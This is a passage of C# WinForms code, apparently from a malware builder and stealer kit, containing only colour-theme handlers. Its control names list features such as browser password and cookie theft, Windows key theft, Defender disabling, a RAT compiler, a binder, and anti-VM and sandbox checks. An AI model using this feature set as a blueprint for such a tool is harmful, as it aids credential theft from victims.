        this.label34.ForeColor = Color.DarkRed;
        this.label35.ForeColor = Color.DarkRed;
        this.tNameLabel.ForeColor = Color.DarkRed;
        this.tEmailLabel.ForeColor = Color.DarkRed;
        this.tPhoneLabel.ForeColor = Color.DarkRed;
        this.tIDLabel.ForeColor = Color.DarkRed;
        this.tMFALabel.ForeColor = Color.DarkRed;
        this.tVLabel.ForeColor = Color.DarkRed;
        this.kbBox.ForeColor = Color.DarkRed;
        this.mbBox.ForeColor = Color.DarkRed;
        this.gbBox.ForeColor = Color.DarkRed;
        this.pumpButton.ForeColor = Color.DarkRed;
        this.pumpButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.pumpButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.button4.ForeColor = Color.DarkRed;
        this.button4.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.button4.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.tokenChecker.ForeColor = Color.DarkRed;
        this.tokenChecker.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.tokenChecker.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.flooderEmSelect.ForeColor = Color.DarkRed;
        this.flooderEmSelect.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.flooderEmSelect.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.button6.ForeColor = Color.DarkRed;
        this.button5.ForeColor = Color.DarkRed;
        this.wdeleteButton.ForeColor = Color.DarkRed;
        this.wdeleteButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.wdeleteButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.button8.ForeColor = Color.DarkRed;
        this.button8.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.button8.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.ratButton.ForeColor = Color.DarkRed;
        this.ratBox.ForeColor = Color.DarkRed;
        this.pipBox.ForeColor = Color.DarkRed;
        this.label44.ForeColor = Color.DarkRed;
        this.rURLBox.ForeColor = Color.DarkRed;
        this.label42.ForeColor = Color.DarkRed;
        this.label40.ForeColor = Color.DarkRed;
        this.ratTokenBox.ForeColor = Color.DarkRed;
        this.label43.ForeColor = Color.DarkRed;
        this.label45.ForeColor = Color.DarkRed;
        this.label41.ForeColor = Color.DarkRed;
        this.ratInstallButton.ForeColor = Color.DarkRed;
        this.ratInstallButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.ratInstallButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.insertButton.ForeColor = Color.DarkRed;
        this.insertButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.insertButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.ratCompileButton.ForeColor = Color.DarkRed;
        this.ratCompileButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.ratCompileButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.saveButton.ForeColor = Color.DarkRed;
        this.saveButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.saveButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.nitroBox.ForeColor = Color.DarkRed;
        this.cmdBox.ForeColor = Color.DarkRed;
        this.page1.ForeColor = Color.DarkRed;
        this.page2.ForeColor = Color.DarkRed;
        this.label47.ForeColor = Color.DarkRed;
        this.fixButton.ForeColor = Color.DarkRed;
        this.qrButton.ForeColor = Color.DarkRed;
        this.label50.ForeColor = Color.DarkRed;
        this.label46.ForeColor = Color.DarkRed;
        this.label51.ForeColor = Color.DarkRed;
        this.qrStartBtn.ForeColor = Color.DarkRed;
        this.qrStartBtn.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.qrStartBtn.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.button7.ForeColor = Color.DarkRed;
        this.button7.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.button7.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.btnInventory.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.btnDashboard.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.btnSettings.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.btnWork.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.btnParty.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.btnMap.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.ratButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.qrButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.shYes.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.shYes.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.shNo.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.shNo.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.btnUpdates.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.btnUpdates.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.fixButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.fixButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.englishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.englishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.russianButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.russianButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.frenchButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.frenchButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.polishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.polishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.spanishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.spanishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.turkishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.turkishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.germanButton.ForeColor = Color.DarkRed;
        this.germanButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.germanButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.arabicButton.ForeColor = Color.DarkRed;
        this.arabicButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.arabicButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.binderButton.ForeColor = Color.DarkRed;
        this.binderButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.binderButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.button11.ForeColor = Color.DarkRed;
        this.button11.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.button11.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.button9.ForeColor = Color.DarkRed;
        this.button9.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.button9.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.button10.ForeColor = Color.DarkRed;
        this.button10.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.button10.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.button12.ForeColor = Color.DarkRed;
        this.button12.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.button12.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.button13.ForeColor = Color.DarkRed;
        this.button13.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.button13.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.wizardBox.ForeColor = Color.DarkRed;
        this.desBox.ForeColor = Color.DarkRed;
        this.label55.ForeColor = Color.DarkRed;
        this.label48.ForeColor = Color.DarkRed;
        this.label49.ForeColor = Color.DarkRed;
        this.label58.ForeColor = Color.DarkRed;
        this.label59.ForeColor = Color.DarkRed;
        this.label64.ForeColor = Color.DarkRed;
        this.fakesButton.ForeColor = Color.DarkRed;
        this.fakesButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.fakesButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.backButton.ForeColor = Color.DarkRed;
        this.backButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
        this.backButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        this.label69.ForeColor = Color.DarkRed;
        this.sniffersBox.ForeColor = Color.DarkRed;
        this.debugBox.ForeColor = Color.DarkRed;
        this.vmBox.ForeColor = Color.DarkRed;
        this.sandboxBox.ForeColor = Color.DarkRed;
        this.emuBox.ForeColor = Color.DarkRed;
    }

    private void button1_Click(object sender, EventArgs e)
    {
        this.button1.FlatAppearance.BorderSize = 1;
        this.button2.FlatAppearance.BorderSize = 0;
        this.redButton.FlatAppearance.BorderSize = 0;
        this.button3.FlatAppearance.BorderSize = 0;
        this.cButton = "green";
        if (this.translateLabel.Text != "null")
        {
            this.translateLabel.ForeColor = Color.LimeGreen;
        }
        if (this.checkingLabel.Text != "null")
        {
            this.checkingLabel.ForeColor = Color.LimeGreen;
        }
        this.usernameLabel.ForeColor = Color.LimeGreen;
        this.versionLabel.ForeColor = Color.LimeGreen;
        this.pnlNav.BackColor = Color.LimeGreen;
        this.btnDashboard.ForeColor = Color.LimeGreen;
        this.btnInventory.ForeColor = Color.LimeGreen;
        this.btnWork.ForeColor = Color.LimeGreen;
        this.btnMap.ForeColor = Color.LimeGreen;
        this.btnParty.ForeColor = Color.LimeGreen;
        this.btnSettings.ForeColor = Color.LimeGreen;
        this.label1.ForeColor = Color.LimeGreen;
        this.label2.ForeColor = Color.LimeGreen;
        this.label3.ForeColor = Color.LimeGreen;
        this.label4.ForeColor = Color.LimeGreen;
        this.label5.ForeColor = Color.LimeGreen;
        this.label6.ForeColor = Color.LimeGreen;
        this.label7.ForeColor = Color.LimeGreen;
        this.shYes.ForeColor = Color.LimeGreen;
        this.shNo.ForeColor = Color.LimeGreen;
        this.btnUpdates.ForeColor = Color.LimeGreen;
        this.webhookBox.ForeColor = Color.LimeGreen;
        this.englishButton.ForeColor = Color.LimeGreen;
        this.russianButton.ForeColor = Color.LimeGreen;
        this.frenchButton.ForeColor = Color.LimeGreen;
        this.polishButton.ForeColor = Color.LimeGreen;
        this.turkishButton.ForeColor = Color.LimeGreen;
        this.spanishButton.ForeColor = Color.LimeGreen;
        this.label57.ForeColor = Color.LimeGreen;
        this.label54.ForeColor = Color.LimeGreen;
        this.label53.ForeColor = Color.LimeGreen;
        this.label37.ForeColor = Color.LimeGreen;
        this.label52.ForeColor = Color.LimeGreen;
        this.textBox6.ForeColor = Color.LimeGreen;
        this.textBox1.ForeColor = Color.LimeGreen;
        this.textBox3.ForeColor = Color.LimeGreen;
        this.checkBox2.ForeColor = Color.LimeGreen;
        this.checkBox3.ForeColor = Color.LimeGreen;
        this.checkBox4.ForeColor = Color.LimeGreen;
        this.label17.ForeColor = Color.LimeGreen;
        this.label18.ForeColor = Color.LimeGreen;
        this.label19.ForeColor = Color.LimeGreen;
        this.label20.ForeColor = Color.LimeGreen;
        this.label21.ForeColor = Color.LimeGreen;
        this.faketitleBox.ForeColor = Color.LimeGreen;
        this.fakeMessageBox.ForeColor = Color.LimeGreen;
        this.obfuscateBox.ForeColor = Color.LimeGreen;
        this.errorBox.ForeColor = Color.LimeGreen;
        this.startupBox.ForeColor = Color.LimeGreen;
        this.defenderBox.ForeColor = Color.LimeGreen;
        this.taskmanagerBox.ForeColor = Color.LimeGreen;
        this.bsodBox.ForeColor = Color.LimeGreen;
        this.pluginBox.ForeColor = Color.LimeGreen;
        this.blockerBox.ForeColor = Color.LimeGreen;
        this.hidesBox.ForeColor = Color.LimeGreen;
        this.jumpscareBox.ForeColor = Color.LimeGreen;
        this.inputdBox.ForeColor = Color.LimeGreen;
        this.swinkeyBox.ForeColor = Color.LimeGreen;
        this.sbrpassBox.ForeColor = Color.LimeGreen;
        this.sbrCookiesBox.ForeColor = Color.LimeGreen;
        this.sVpnBox.ForeColor = Color.LimeGreen;
        this.swifiBox.ForeColor = Color.LimeGreen;
        this.sbrhisBox.ForeColor = Color.LimeGreen;
        this.dinternetBox.ForeColor = Color.LimeGreen;
        this.pluginSource.Lexer = Lexer.Cpp;
        this.pluginSource.StyleResetDefault();
        this.pluginSource.Styles[32].Font = "Consolas";
        this.pluginSource.Styles[32].Size = 10;
        this.pluginSource.Styles[32].BackColor = Color.FromArgb(5, 5, 5);
        this.pluginSource.Styles[32].ForeColor = Color.LimeGreen;
        this.pluginSource.StyleClearAll();
        this.pluginSource.Styles[0].ForeColor = Color.LimeGreen;
        this.pluginSource.Styles[1].ForeColor = Color.FromArgb(0, 128, 0);
        this.pluginSource.Styles[2].ForeColor = Color.FromArgb(0, 128, 0);
        this.pluginSource.Styles[15].ForeColor = Color.FromArgb(128, 128, 128);
        this.pluginSource.Styles[4].ForeColor = Color.Olive;
        this.pluginSource.Styles[5].ForeColor = Color.Blue;
        this.pluginSource.Styles[16].ForeColor = Color.Blue;
        this.pluginSource.Styles[6].ForeColor = Color.FromArgb(163, 21, 21);
        this.pluginSource.Styles[7].ForeColor = Color.FromArgb(163, 21, 21);
        this.pluginSource.Styles[13].ForeColor = Color.FromArgb(163, 21, 21);
        this.pluginSource.Styles[12].BackColor = Color.Pink;
        this.pluginSource.Styles[10].ForeColor = Color.Purple;
        this.pluginSource.Styles[9].ForeColor = Color.Maroon;
        this.pluginSource.Margins[0].Width = 16;
        this.pluginSource.Styles[33].BackColor = Color.FromArgb(16, 16, 16);
        this.pluginSource.ScrollWidth = 1;
        this.label9.ForeColor = Color.LimeGreen;
        this.label8.ForeColor = Color.LimeGreen;
        this.fileinfoLabel.ForeColor = Color.LimeGreen;
        this.buildingLabel.ForeColor = Color.LimeGreen;
        this.embedBox.BackColor = Color.LimeGreen;
        this.webhookCheck.ForeColor = Color.LimeGreen;
        this.iconUpload.ForeColor = Color.LimeGreen;
        this.iconUpload.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.iconUpload.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.colorSelect.ForeColor = Color.LimeGreen;
        this.colorSelect.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.colorSelect.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.generateButton.ForeColor = Color.LimeGreen;
        this.generateButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.generateButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.cloneButton.ForeColor = Color.LimeGreen;
        this.cloneButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.cloneButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.label14.ForeColor = Color.LimeGreen;
        this.label10.ForeColor = Color.LimeGreen;
        this.label11.ForeColor = Color.LimeGreen;
        this.label12.ForeColor = Color.LimeGreen;
        this.label13.ForeColor = Color.LimeGreen;
        this.label15.ForeColor = Color.LimeGreen;
        this.label16.ForeColor = Color.LimeGreen;
        this.dAIObox.ForeColor = Color.LimeGreen;
        this.nameBox.ForeColor = Color.LimeGreen;
        this.ipBox.ForeColor = Color.LimeGreen;
        this.macBox.ForeColor = Color.LimeGreen;
        this.tokenBox.ForeColor = Color.LimeGreen;
        this.winBox.ForeColor = Color.LimeGreen;
        this.exportCredentials.ForeColor = Color.LimeGreen;
        this.exportCredentials.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.exportCredentials.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.dAIOupload.ForeColor = Color.LimeGreen;
        this.dAIOupload.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.dAIOupload.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.label28.ForeColor = Color.LimeGreen;
        this.pumpBox.ForeColor = Color.LimeGreen;
        this.pumpPathBox.ForeColor = Color.LimeGreen;
        this.label22.ForeColor = Color.LimeGreen;
        this.label29.ForeColor = Color.LimeGreen;
        this.miscWebhookBox.ForeColor = Color.LimeGreen;
        this.TokenCheckerBox.ForeColor = Color.LimeGreen;
        this.label23.ForeColor = Color.LimeGreen;
        this.label24.ForeColor = Color.LimeGreen;
        this.userBox.ForeColor = Color.LimeGreen;
        this.textBox2.ForeColor = Color.LimeGreen;
        this.label27.ForeColor = Color.LimeGreen;
        this.flooderEmbed.BackColor = Color.LimeGreen;
        this.safeBox.ForeColor = Color.LimeGreen;
        this.label26.ForeColor = Color.LimeGreen;
        this.label25.ForeColor = Color.LimeGreen;
        this.label36.ForeColor = Color.LimeGreen;
        this.label30.ForeColor = Color.LimeGreen;
        this.label31.ForeColor = Color.LimeGreen;
        this.label32.ForeColor = Color.LimeGreen;
        this.label33.ForeColor = Color.LimeGreen;
        this.label34.ForeColor = Color.LimeGreen;
        this.label35.ForeColor = Color.LimeGreen;
        this.tNameLabel.ForeColor = Color.LimeGreen;
        this.tEmailLabel.ForeColor = Color.LimeGreen;
        this.tPhoneLabel.ForeColor = Color.LimeGreen;
        this.tIDLabel.ForeColor = Color.LimeGreen;
        this.tMFALabel.ForeColor = Color.LimeGreen;
        this.tVLabel.ForeColor = Color.LimeGreen;
        this.kbBox.ForeColor = Color.LimeGreen;
        this.mbBox.ForeColor = Color.LimeGreen;
        this.gbBox.ForeColor = Color.LimeGreen;
        this.pumpButton.ForeColor = Color.LimeGreen;
        this.pumpButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.pumpButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.button4.ForeColor = Color.LimeGreen;
        this.button4.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.button4.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.tokenChecker.ForeColor = Color.LimeGreen;
        this.tokenChecker.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.tokenChecker.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.flooderEmSelect.ForeColor = Color.LimeGreen;
        this.flooderEmSelect.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.flooderEmSelect.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.button6.ForeColor = Color.LimeGreen;
        this.button5.ForeColor = Color.LimeGreen;
        this.wdeleteButton.ForeColor = Color.LimeGreen;
        this.wdeleteButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.wdeleteButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.button8.ForeColor = Color.LimeGreen;
        this.button8.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.button8.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.ratButton.ForeColor = Color.LimeGreen;
        this.ratBox.ForeColor = Color.LimeGreen;
        this.pipBox.ForeColor = Color.LimeGreen;
        this.label44.ForeColor = Color.LimeGreen;
        this.rURLBox.ForeColor = Color.LimeGreen;
        this.label42.ForeColor = Color.LimeGreen;
        this.label40.ForeColor = Color.LimeGreen;
        this.ratTokenBox.ForeColor = Color.LimeGreen;
        this.label43.ForeColor = Color.LimeGreen;
        this.label45.ForeColor = Color.LimeGreen;
        this.label41.ForeColor = Color.LimeGreen;
        this.ratInstallButton.ForeColor = Color.LimeGreen;
        this.ratInstallButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.ratInstallButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.insertButton.ForeColor = Color.LimeGreen;
        this.insertButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.insertButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.ratCompileButton.ForeColor = Color.LimeGreen;
        this.ratCompileButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.ratCompileButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.saveButton.ForeColor = Color.LimeGreen;
        this.saveButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.saveButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.nitroBox.ForeColor = Color.LimeGreen;
        this.cmdBox.ForeColor = Color.LimeGreen;
        this.page1.ForeColor = Color.LimeGreen;
        this.page2.ForeColor = Color.LimeGreen;
        this.label47.ForeColor = Color.LimeGreen;
        this.fixButton.ForeColor = Color.LimeGreen;
        this.qrButton.ForeColor = Color.LimeGreen;
        this.label50.ForeColor = Color.LimeGreen;
        this.label46.ForeColor = Color.LimeGreen;
        this.label51.ForeColor = Color.LimeGreen;
        this.qrStartBtn.ForeColor = Color.LimeGreen;
        this.qrStartBtn.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.qrStartBtn.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.button7.ForeColor = Color.LimeGreen;
        this.button7.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.button7.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.btnInventory.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.btnDashboard.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.btnSettings.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.btnWork.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.btnParty.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.btnMap.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.ratButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.qrButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.shYes.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.shYes.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.shNo.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.shNo.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.btnUpdates.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.btnUpdates.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.fixButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.fixButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.englishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.englishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.russianButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.russianButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.frenchButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.frenchButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.polishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.polishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.spanishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.spanishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.turkishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.turkishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.germanButton.ForeColor = Color.LimeGreen;
        this.germanButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.germanButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.arabicButton.ForeColor = Color.LimeGreen;
        this.arabicButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.arabicButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.binderButton.ForeColor = Color.LimeGreen;
        this.binderButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.binderButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.button11.ForeColor = Color.LimeGreen;
        this.button11.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.button11.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.button9.ForeColor = Color.LimeGreen;
        this.button9.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.button9.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.button10.ForeColor = Color.LimeGreen;
        this.button10.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.button10.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.button12.ForeColor = Color.LimeGreen;
        this.button12.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.button12.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.button13.ForeColor = Color.LimeGreen;
        this.button13.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.button13.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.wizardBox.ForeColor = Color.LimeGreen;
        this.desBox.ForeColor = Color.LimeGreen;
        this.label55.ForeColor = Color.LimeGreen;
        this.label48.ForeColor = Color.LimeGreen;
        this.label49.ForeColor = Color.LimeGreen;
        this.label58.ForeColor = Color.LimeGreen;
        this.label59.ForeColor = Color.LimeGreen;
        this.label64.ForeColor = Color.LimeGreen;
        this.fakesButton.ForeColor = Color.LimeGreen;
        this.fakesButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.fakesButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.backButton.ForeColor = Color.LimeGreen;
        this.backButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
        this.backButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
        this.label69.ForeColor = Color.LimeGreen;
        this.sniffersBox.ForeColor = Color.LimeGreen;
        this.debugBox.ForeColor = Color.LimeGreen;
        this.vmBox.ForeColor = Color.LimeGreen;
        this.sandboxBox.ForeColor = Color.LimeGreen;
        this.emuBox.ForeColor = Color.LimeGreen;
    }

    private void button2_Click(object sender, EventArgs e)
    {
        this.button1.FlatAppearance.BorderSize = 0;
        this.button2.FlatAppearance.BorderSize = 1;
        this.button3.FlatAppearance.BorderSize = 0;
        this.redButton.FlatAppearance.BorderSize = 0;
        this.cButton = "blue";
        if (this.translateLabel.Text != "null")
        {
            this.translateLabel.ForeColor = Color.DodgerBlue;
        }
        if (this.checkingLabel.Text != "null")
        {
            this.checkingLabel.ForeColor = Color.DodgerBlue;
        }
        this.usernameLabel.ForeColor = Color.DodgerBlue;
        this.versionLabel.ForeColor = Color.DodgerBlue;
        this.pnlNav.BackColor = Color.DodgerBlue;
        this.btnDashboard.ForeColor = Color.DodgerBlue;
        this.btnInventory.ForeColor = Color.DodgerBlue;
        this.btnWork.ForeColor = Color.DodgerBlue;
        this.btnMap.ForeColor = Color.DodgerBlue;
        this.btnParty.ForeColor = Color.DodgerBlue;
        this.btnSettings.ForeColor = Color.DodgerBlue;
        this.label1.ForeColor = Color.DodgerBlue;
        this.label2.ForeColor = Color.DodgerBlue;
        this.label3.ForeColor = Color.DodgerBlue;
        this.label4.ForeColor = Color.DodgerBlue;
        this.label5.ForeColor = Color.DodgerBlue;
        this.label6.ForeColor = Color.DodgerBlue;
        this.label7.ForeColor = Color.DodgerBlue;
        this.shYes.ForeColor = Color.DodgerBlue;
        this.shNo.ForeColor = Color.DodgerBlue;
        this.btnUpdates.ForeColor = Color.DodgerBlue;
        this.webhookBox.ForeColor = Color.DodgerBlue;
        this.englishButton.ForeColor = Color.DodgerBlue;
        this.russianButton.ForeColor = Color.DodgerBlue;
        this.frenchButton.ForeColor = Color.DodgerBlue;
        this.polishButton.ForeColor = Color.DodgerBlue;
        this.turkishButton.ForeColor = Color.DodgerBlue;
        this.spanishButton.ForeColor = Color.DodgerBlue;
        this.label57.ForeColor = Color.DodgerBlue;
        this.label54.ForeColor = Color.DodgerBlue;
        this.label53.ForeColor = Color.DodgerBlue;
        this.label37.ForeColor = Color.DodgerBlue;
        this.label52.ForeColor = Color.DodgerBlue;
